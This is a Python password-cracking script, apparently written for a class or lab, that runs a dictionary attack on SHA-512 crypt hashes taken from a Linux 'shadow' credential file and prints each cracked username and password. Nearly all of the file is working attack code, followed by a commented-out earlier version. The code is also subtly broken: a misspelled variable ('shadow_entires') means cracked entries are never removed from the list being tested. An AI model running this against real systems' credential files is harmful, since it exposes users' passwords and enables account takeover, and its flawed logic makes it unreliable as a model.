#!/usr/bin/env python3
# Script that performs a dictionary attack against known password hashes
# Needs a dictionary file, suggested to use https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials
# By Keegan 10/26

# imports
import os
from passlib.hash import sha512_crypt

# load dictionary function
def load_dictionary(file_name):
    # get current directory
    script_path = os.path.abspath(__file__)
    script_dir = os.path.dirname(script_path)
    # build file path
    file_path = os.path.join(script_dir, file_name)
    # open file for reading
    f = open(file_path, "r")
    # read contents
    contents = f.readlines()
    return contents
# create hash function
def create_hash(password, salt):
    hashed_pass = sha512_crypt.using(rounds=5000).hash(password, salt=salt)
    return hashed_pass
# split shadow line
def split_shadow(shadowLine):
    # separate username from shadow line
    split_shadow_parts = shadowLine.split(":")
    # username
    shadow_user = split_shadow_parts[0]
    # shadow line
    user_shadow_line = split_shadow_parts[1]
    # salt
    user_salt = user_shadow_line.split("$")[2]
    return (shadow_user, user_salt, user_shadow_line)

# load dictionary
password_guesses = load_dictionary("top1000.txt") # top10000000.txt, top1000.txt, top10.txt

shadow_file = load_dictionary("shadow")

shadow_entries = []
for shadow_line in shadow_file[11:]:
    shadow_user, user_salt, user_shadow_line = split_shadow(shadow_line)
    shadow_entries.append([shadow_user, user_salt, user_shadow_line.strip()])

cracked = {}
count = 0

for password in password_guesses:
    password = password.strip()
    count += 1
    print(f"Count: {count}", end='\r')

    still_uncracked = []
    
    for entry in shadow_entries:
        shadow_user, user_salt, target_hash = entry
        hashed_guess = create_hash(password, user_salt)
        if hashed_guess == target_hash:
            cracked[shadow_user] = password
            print(f"{shadow_user}: {password}\tFound on Line: {count}")
        else:
            still_uncracked.append(entry)

    shadow_entires = still_uncracked
    if not shadow_entries:
        break

for shadow_user, user_salt, target_hash in shadow_entires:
    print(f"{shadow_user}: X")




















# # checks the last 20 lines of the shadow doc
# count = 0
# for shadow_line in shadow_file[11:]:
#     # captures the variables
#     shadow_user, user_salt, user_shadow_line = split_shadow(shadow_line)
#     password_found = False

# # for each line/guess
#     for password_guess in password_guesses:
#         # hash guess
#         hashed_guess = create_hash(password_guess.strip(), user_salt)
#         # compare hash to guess
#         if user_shadow_line == hashed_guess:
#             # print guess
#             print(shadow_user, password_guess.strip())
#             # quit
#             password_found = True
#             break
#         count += 1
#         print(f"Count: {count}", end='\r')